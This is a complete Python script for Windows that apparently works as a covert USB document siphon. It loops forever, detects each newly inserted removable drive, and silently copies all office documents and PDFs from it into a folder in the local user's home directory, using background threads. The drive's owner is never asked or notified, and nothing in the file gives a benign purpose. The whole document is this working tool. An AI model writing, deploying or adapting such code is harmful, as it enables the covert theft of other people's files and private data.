# Python 3.5
import os
import time
import shutil
import logging
import threading
import win32file
import win32api


def locate_usb():
    drive_list = []
    drivebits = win32file.GetLogicalDrives()
    for d in range(1, 26):
        mask = 1 << d
        if drivebits & mask:
            drname = '%c:\\' % chr(ord('A') + d)
            driveType = win32file.GetDriveType(drname)
            if driveType == win32file.DRIVE_REMOVABLE:
                drive_list.append(drname)
    return drive_list


def crawl_drive(path, matchFunc):
    for curr_path, dirs, files in os.walk(path):
        for f in filter(matchFunc, files):
            yield (os.path.relpath(curr_path,path),os.path.join(curr_path, f))


def ext_filt(filename):
    return (filename.endswith('.xls') or filename.endswith('.ppt')
            or filename.endswith('.pdf') or filename.endswith('.doc')
            or filename.endswith('.docx') or filename.endswith('.xlsx')
            or filename.endswith('.pptx'))


def copy(files, dest):
    if not os.path.exists(dest):
        os.makedirs(dest)
    for f in files: 
        print('copying: ',f, end="\n")
        shutil.copy2(f, dest)

def search_copy(drive):
    info = win32api.GetVolumeInformation(drive)
    drive_path = os.path.join(os.path.expanduser('~'),"_".join(str(i) for i in info))
    os.makedirs(drive_path, exist_ok=True)
    files = crawl_drive(drive, ext_filt)
    indexed_files = {}
    for (rel_path, f) in files:
        dest_path = os.path.join(drive_path,rel_path)
        if dest_path in indexed_files:
            indexed_files[dest_path].append(f)
        else:
            indexed_files[dest_path] = []
            indexed_files[dest_path].append(f)
    for dest,fs in indexed_files.items():
        t = threading.Thread(target=copy, args=(fs, dest))
        t.daemon = True
        t.start()



def poll_usb(prev):
    curr = locate_usb()
    n = list(set(curr).difference(set(prev)))
    for drive in n:
        print(drive)
        try:
            search_copy(drive)
        except Exception as e:
            logging.exception(e)
            continue
    time.sleep(2)
    return curr

prev = []
while(True):
    prev = poll_usb(prev)    
